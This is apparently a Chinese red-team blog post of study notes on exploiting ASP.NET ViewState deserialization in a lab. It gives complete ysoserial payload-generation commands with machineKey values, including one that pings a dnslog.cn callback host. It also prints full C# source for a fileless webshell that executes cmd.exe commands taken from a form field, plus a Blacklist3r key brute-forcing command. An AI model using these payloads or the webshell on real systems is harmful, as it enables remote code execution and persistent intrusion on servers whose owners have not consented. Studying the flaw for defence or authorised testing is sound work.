---
layout: post
title: "【网络安全】ASP.NET ViewState反序列化漏洞学习"
date: 2024-08-12
author: "3thernet"
header-img: "img/bg-touhou-3.jpg"
tags: []
---

最近连续参加的几次攻防都有见到 ViewState 反序列化漏洞 getshell 的身影，算是红队基本功，简单做下笔记。

实验环境：

- [3thernet/viewstate-deserialization-lab (github.com)](https://github.com/3thernet/viewstate-deserialization-lab)

相关工具：

1. [ysoserial](https://github.com/pwntester/ysoserial.net)

2. [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)

查看.NET Framework版本：

```cs
using System;
using System.Runtime.InteropServices;

class Program
{
    static void Main()
    {
        // 输出真正的.NET Framework版本
        Console.WriteLine(RuntimeInformation.FrameworkDescription);
    }
}
```

注意在网站调试信息中产生的`版本信息: Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.8.9232.0`实际上表示的是运行时版本CLR为 4.0.30319，ASP.NET 组件版本 4.8.9256.0

参考：[确定已安装的 .NET Framework 版本 - .NET Framework  (Microsoft Learn)](https://learn.microsoft.com/zh-cn/dotnet/framework/migration-guide/how-to-determine-which-versions-are-installed)

## 0x01 概述

ViewState用于在请求之间保持Web控件和页面的状态，防止服务器返回错误导致状态被清空。数据会被序列化成Base64字符串并嵌入页面的隐藏字段（通常是`__VIEWSTATE`）。

漏洞成因在于ASP.NET使用`LosFomatter`序列化 ViewState，并使用`ObjectStateFormatter`反序列化 ViewState。而 ViewState 又完全由客户端提交，尽管过程中可以进行**加密**和**签名**，但一旦相关的 Machinekey（decryption, validation相关信息）泄露，就会触发 ObjectStateFormatter 的反序列化漏洞。

MachineKey 通常显示配置在`web.config`文件中。如果没有显式配置，ASP.NET会自动生成一个密钥，但在应用程序重启时会发生变化。

示例：

```
<machineKey 
validationKey="F2D27DF0348E9A3EAD6AC66330C31F821394D4CD1A5E139EEE85EA9D9F2A963E55EC87572F699FB834292CC9E37AD56B6B26AA379106CBA5E9AA544C688F3E92" 
decryptionKey="F6D5A5C8DDEC57481610829F58D6C95BDAC5FA21082F3FA9CB5A36DCEAACBEDB" 
validation="SHA1" 
decryption="AES" />
```

## 0x02 利用条件

1. 未开启MAC验证和加密

2. ASP.NET<=4.0，开启MAC验证，无论是否开启加密
   
   - ysoserial 工具只需要知道 validation 算法，validationkey 来生成 ViewState 的 payload
   
   - 即使`ViewStateEncryptionMode`已设置为`Always`，如果ASP.NET<4.5.2 则仅检查请求中是否存在`__VIEWSTATEENCRYPTED`参数，如果删除此参数并发送未加密的有效负载，ViewState 仍将被处理（这是一个BUG）

3. ASP.NET>=4.5，开启MAC验证
   
   - 未开启加密，ysoserial 工具只需要知道 validation 算法，validationkey 来生成 ViewState 的 payload
   
   - 开启加密，ysoserial 工具除了需要知道 validation 算法，validationkey，还需要知道 decryption算法和 decryptionkey 来生成 ViewState 的 payload
   
   - Web.config 必须要设置`<httpRuntime targetFramework="4.5" />`或者在machinekey加入`compatibilityMode=”Framework45"`字段才能解决未加密ViewState被处理的BUG

### 2.1 未开启MAC验证

未开启MAC验证的情况不太常见，ASP.NET4.5.2版本以后强制开启 MAC 验证（KB2905247），手动关闭需要两步：

1、修改注册表 AspNetEnforceViewStateMac 为 0

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{version}`

2、修改 web.config `<pages enableViewStateMac="false" />`

判断是否开启MAC验证：发送`__VIEWSTATE=AAAA`（简单的base64），如果目标页面回显：

```html
<title>此页的状态信息无效，可能已损坏。</title>
```

表示关闭了MAC验证。

如果回显：

```html
<title>验证视图状态 MAC 失败。如果此应用程序由网络场或群集托管，请确保 <machineKey> 配置指定了相同的 validationKey 和验证算法。不能在群集中使用 AutoGenerate。<br><br>请参阅 http://go.microsoft.com/fwlink/?LinkID=314055 获取详细信息。</title>
```

则表示开启了MAC验证。

如果程序员在`<system.web>`中加入`<customErrors mode="On" />`，或者自定义错误页面就无法判断：

```html
<title>运行时错误</title>
```

假定我们现在已经关闭了MAC验证，直接上 payload：

```powershell
.\ysoserial.exe
-o base64
-g TextFormattingRunProperties # 换成TypeConfuseDelegate打不出dnslog回显
-f LosFormatter
-c "ping 123456.dnslog.cn"
```

![](/img/2024-08-12-viewstate-exp/1.png)

填入`__VIEWSTATE`字段，回显成功：

![](/img/2024-08-12-viewstate-exp/2.png)

### 2.2 ASP.NET <=4.0，开启MAC验证

ASP.NET 常见的签名算法为 HMACSha256（也可能是SHA1），计算出的签名会附加在 ViewState 数据最后。MacKeyModifier 是签名算法的 Salt，由 ClientId 和 ViewStateUserKey 两部分拼接而成，默认情况下，ViewStateUserKey 为空（也很少会设置），ClientId 为当前页面虚拟目录路径(apppath)和类型名称(path)的 HashCode 之和，并以 Hex 形式存放于名为`__VIEWSTATEGENERATOR`的表单字段中。

.NET<=4.0 的表单中会带有`__VIEWSTATEGENERATOR`，对于不含该字段的高版本 .NET，ysoserial 需要使用`path`和`apppath`选项：

```powershell
.\ysoserial.exe
-p ViewState
-g TextFormattingRunProperties 
-c "echo 123 > e:\test.txt"
--path="/default.aspx"
--apppath="/"
--validationalg="SHA1"
--validationkey="F2D27DF0348E9A3EAD6AC66330C31F821394D4CD1A5E139EEE85EA9D9F2A963E55EC87572F699FB834292CC9E37AD56B6B26AA379106CBA5E9AA544C688F3E92"
--islegacy # 表示ASP.NET<=4.0，不需要加密密钥

.\ysoserial.exe
-p ViewState
-g TextFormattingRunProperties
-c "echo 123 > e:\test.txt"
--generator=CA0B0334 
--validationalg="SHA1"
--validationkey="F2D27DF0348E9A3EAD6AC66330C31F821394D4CD1A5E139EEE85EA9D9F2A963E55EC87572F699FB834292CC9E37AD56B6B26AA379106CBA5E9AA544C688F3E92"
--isdebug # 开启后能看到CA0B0334等同于path="/"apppath="/default.aspx"
# 使用generator选项，相当于默认ASP.NET<=4.0，因此不需要islegacy选项
```

![](/img/2024-08-12-viewstate-exp/3.png)

![](/img/2024-08-12-viewstate-exp/4.png)

### 2.3 ASP.NET >= 4.5，开启MAC验证

未开启加密的情况同2.2，下面是开启加密的payload生成：

```powershell
.\ysoserial.exe
-p ViewState 
-g TypeConfuseDelegate 
-c "echo 123 > e:\test.txt" 
--path="/default.aspx"
--appath="/"
--validationalg="SHA1" 
--validationkey="F2D27DF0348E9A3EAD6AC66330C31F821394D4CD1A5E139EEE85EA9D9F2A963E55EC87572F699FB834292CC9E37AD56B6B26AA379106CBA5E9AA544C688F3E92" 
--decryptionalg="AES" 
--decryptionkey="F6D5A5C8DDEC57481610829F58D6C95BDAC5FA21082F3FA9CB5A36DCEAACBEDB"

# 从逻辑上下面的命令也应当正确，但事实却是MAC验证失败，原因不明
.\ysoserial.exe
-p ViewState 
-g TypeConfuseDelegate 
-c "echo 123 > e:\test.txt" 
--generator=CA0B0334
--validationalg="SHA1" 
--validationkey="F2D27DF0348E9A3EAD6AC66330C31F821394D4CD1A5E139EEE85EA9D9F2A963E55EC87572F699FB834292CC9E37AD56B6B26AA379106CBA5E9AA544C688F3E92" 
--decryptionalg="AES" 
--decryptionkey="F6D5A5C8DDEC57481610829F58D6C95BDAC5FA21082F3FA9CB5A36DCEAACBEDB"
--isencrypted
```

### 2.4 Webshell

参考：[玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門 (DEVCORE 戴夫寇爾)](https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/)

首先需要 DisableTypeCheck：

```powershell
.\ysoserial.exe 
-p ViewState 
-g ActivitySurrogateDisableTypeCheck 
-c "ignore" 
--path="/default.aspx" 
--apppath="/" 
--validationalg="SHA1" 
--validationkey="F2D27DF0348E9A3EAD6AC66330C31F821394D4CD1A5E139EEE85EA9D9F2A963E55EC87572F699FB834292CC9E37AD56B6B26AA379106CBA5E9AA544C688F3E92" 
--decryptionalg="AES" 
--decryptionkey="F6D5A5C8DDEC57481610829F58D6C95BDAC5FA21082F3FA9CB5A36DCEAACBEDB"
```

然后在 ysoserial 文件夹下撰写一个用于执行任意代码的类（假定为 ExploitClass.cs）：

```cs
class E
{
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Form["cmd"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        } catch (System.Exception) {}
        context.Response.Flush();
        context.Response.End();
    }
}
```

生成 payload：

```powershell
.\ysoserial.exe 
-p ViewState 
-g ActivitySurrogateSelectorFromFile 
-c "ExploitClass.cs;C:/Windows/Microsoft.NET/Framework64/v4.0.30319/System.dll;C:/Windows/Microsoft.NET/Framework64/v4.0.30319/System.Web.dll" 
--path="/default.aspx" 
--apppath="/" 
--validationalg="SHA1" 
--validationkey="F2D27DF0348E9A3EAD6AC66330C31F821394D4CD1A5E139EEE85EA9D9F2A963E55EC87572F699FB834292CC9E37AD56B6B26AA379106CBA5E9AA544C688F3E92" 
--decryptionalg="AES" 
--decryptionkey="F6D5A5C8DDEC57481610829F58D6C95BDAC5FA21082F3FA9CB5A36DCEAACBEDB"
```

之后的请求都附带这个 payload 就可以操作 WebShell 了

![](/img/2024-08-12-viewstate-exp/5.png)

类似的还可以写哥斯拉内存马：

- [.Net ViewState反序列化实现无文件哥斯拉内存马 – Whwlsfb's Tech Blog (wanghw.cn)](https://blog.wanghw.cn/security/dotnet-viewstate-no-file-godzilla-memshell.html)

### 0x03 其他

如果服务器设置了 ViewStateUserKey，yso 还需要在添加`--viewstateuserkey`选项

开启 MAC 验证后必须知道 Machinekey 才能打，一般是通过任意文件读取或者XXE漏洞获得，也可以使用 Blacklist3r 工具爆破：

```powershell
.\ASPNetWrapper.exe
--keypath MachineKeys.txt
--encrypteddata={__VIEWSTATE}
--modifier={__VIEWSTATEGENERATOR}
```

ysoserial 工具的几个 gadget 利用原理还需要继续学习。

一些 .NET 反序列化 CVE：

- CVE-2020-0688

- CVE-2020-16592

- CVE-2021-42321

## 0x05 参考

- [深入 .NET ViewState 反序列化及其利用 (qq.com)](https://mp.weixin.qq.com/s/RlY5HL_ak4G8EdcXyevWDg)

- [.NET 分享ViewState反序列化漏洞个人总结 (qq.com)](https://mp.weixin.qq.com/s/7mtTDKQ3eJet3rxLKZyBNw)

- [通过 ViewState 利用 ASP.NET 中的反序列化 Soroush Dalili （@irsdl） 博客](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

- [ViewState反序列化 - zpchcbd - 博客园 (cnblogs.com)](https://www.cnblogs.com/zpchcbd/p/15112047.html)

- [TypeConfusedDelegate以及魔改yso - Gr3yy's Blog (gr3yyy123.github.io)](https://gr3yyy123.github.io/2022/05/28/TypeConfusedDelegate%E4%BB%A5%E5%8F%8A%E9%AD%94%E6%94%B9yso/)

- [利用ViewState在ASP.NET中实现反序列化RCE - 技术转载 安全矩阵 (smatrix.org)](http://www.smatrix.org/forum/forum.php?mod=viewthread&tid=331)

- [利用.NET 反序列化做权限维持  MYZXCG](https://myzxcg.com/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/)

- [CVE-2020-0688的武器化与.net反序列化漏洞那些事-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/199921#h3-9)

- [Zero Day Initiative — CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
